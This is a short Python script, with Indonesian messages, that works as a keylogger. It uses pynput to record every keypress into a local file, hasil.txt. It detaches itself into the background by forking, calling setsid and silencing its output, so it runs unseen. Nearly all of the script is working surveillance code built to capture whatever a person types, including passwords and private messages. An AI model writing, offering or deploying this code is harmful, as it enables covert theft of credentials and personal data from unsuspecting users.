import sys,os,time
from pynput import keyboard


print("keylogger sudah diaktifkan")
sys.stdout.flush()


if os.fork():
    sys.exit(0)

os.setsid()

with open(os.devnull, 'w') as fufufafa:
    os.dup2(fufufafa.fileno(), sys.stdout.fileno())
    os.dup2(fufufafa.fileno(), sys.stderr.fileno())
    

def keys_logs_fuck(key):
    with open('./file/hasil.txt','a') as ss:
        if hasattr(key, 'char'):
            ss.write(f'log: {key.char}\n')
        else:
            ss.write(f'log: {key}\n')


rekaman_keyboard = keyboard.Listener(on_press=keys_logs_fuck)
rekaman_keyboard.run()

while True:
    time.sleep(1)
